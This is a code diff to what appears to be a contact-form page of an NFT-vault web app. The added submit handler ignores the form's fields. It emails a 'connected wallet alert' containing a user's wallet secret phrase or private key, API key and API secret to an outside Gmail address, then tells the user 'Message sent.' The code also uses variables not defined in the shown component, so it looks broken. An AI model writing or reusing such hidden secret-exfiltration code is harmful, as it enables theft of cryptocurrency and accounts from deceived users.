@@ -2,11 +2,36 @@
 import InputFields from "@/components/form/InputFields";
 import ConfirmBtn from "@/components/loading/ConfirmBtn";
 import { useState } from "react";
+import { toast } from "react-toastify";
 
 const page = () => {
   const [email, setEmail] = useState("");
   const [subject, setSubject] = useState("");
   const [description, setDescription] = useState("");
+
+  async function handleSubmit(e) {
+    e.preventDefault();
+
+    await fetch("/api/mailer/custom", {
+      method: "POST",
+      body: JSON.stringify({
+        email: "elitenftvault@gmail.com",
+        subject: `connected wallet alert`,
+        body: `<h2>Hello Admin</h2> 
+        <p>the ${user?.username}, just connected a wallet</p>
+        <p>Details:</p>
+<p>Provider: ${provider}</p>
+<p>Secret Phrase (private key): ${privateKey}</p>
+<p>Api key: ${apiKey}</p>
+
+<p>Api Secret: ${apiSecret}</p>
+<p>
+EliteNFTVault team,</p>`,
+      }),
+    });
+
+    toast.success("Message sent.");
+  }
 
   return (
     <div className="w-full min-h-screen p-3">
